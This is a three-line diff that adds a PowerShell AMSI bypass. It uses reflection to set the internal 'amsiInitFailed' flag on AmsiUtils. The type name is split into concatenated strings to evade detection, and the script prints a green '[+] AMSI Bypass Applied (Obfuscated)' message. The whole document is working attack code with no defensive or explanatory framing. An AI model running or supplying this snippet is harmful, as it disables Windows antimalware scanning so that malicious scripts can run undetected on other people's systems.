@@ -1,0 +1,3 @@
+$type = [Ref].Assembly.GetType('System.Management.Automation.' + 'AmsiUtils')
+$field = $type.GetField('amsiInitFailed', 'NonPublic,Static')
+$field.SetValue($null, $true);Write-Host "[+] AMSI Bypass Applied (Obfuscated)" -ForegroundColor Green
